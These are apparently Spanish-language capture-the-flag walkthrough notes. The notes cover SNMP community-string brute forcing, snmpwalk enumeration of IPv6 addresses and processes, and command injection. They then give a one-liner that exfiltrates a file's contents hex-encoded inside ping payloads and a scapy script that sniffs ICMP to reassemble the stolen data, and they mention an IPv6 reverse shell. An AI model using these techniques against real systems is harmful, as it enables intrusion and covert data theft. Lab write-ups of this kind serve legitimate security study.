-  No se encuentra vector de ataque por escaneo de *TCP PORT*
- Escanar por udp ``nmap -sU --top-ports 500 -v -n $port -oN $outfile``
- Puerto 161 por udp *find*, servicio *snmp*
- Utilizar **onesixtyone** para bruteforcear por el comunity string ``onesixtyone $ip -c $wordlist``
- Enumeramos informacion del equipo con **snmpwalk** ya habiendo conocido la community string ``snmpwalk -v2c -c public $ip``
- Enumerar la IPV6 de la maquina ``snmpwalk -v2c -c public $ip ipAddressType``
- Reorganizamos la IPV6 encontrada en cuartetos(*los '0' que estan a la izquierda se pueden eliminar*)
- Escaneo de nmap con agregando el parametro ``-6``
- RECOMENDACION: Colocar el IPV6 encontrada en el /etc/hosts para ahorrar el escribir toda la dirección
- Enumerar procesos del sistema ``snmpwalk -v2c -c public $ip hrSWRunName | grep "python"``
- Enumerar el proceso de python ``snmpwalk -vc2 -c public $ip hrSWRuntable | grep "5681" ``
- Probar credenciales en los dos paneles de login encontrados
- Command execution injection
- **TRUCO PARA ROBAR INFORMACION POR PING CON IPV6**:  ``xxd -p -c 4 $archivo | while read line; do ping -c 1 -p $line 127.0.0.1; done`` 
- Recibir el paquete a través de tcpdump ``tcpdump -i lo -w captura.cap -n -v``
- Jugar con python (libreria scapy.all) 
 ```python
#!/bin/python3

from scapy.all import *
import signal

def def_handler(sig, frame):
	print("\n\n[!] Saliendo...")
	sys.exit(1)

def data_parser(packet):
	if packet.haslayer(ICMP):
		if packet[ICMP].type == 8:
			data = packet[ICMP].load[-4:].decode('utf-8')
			print(data, flush=True, end='')
	
#ctrl + c
signal.signal(signal.SIGINT, def_handler)

if __name__ == "__main__":

	sniff(iface='tun0', prn=data_parser)
```
- EXTRA: se puede establecer una reverse shell por IPV6 con python
- 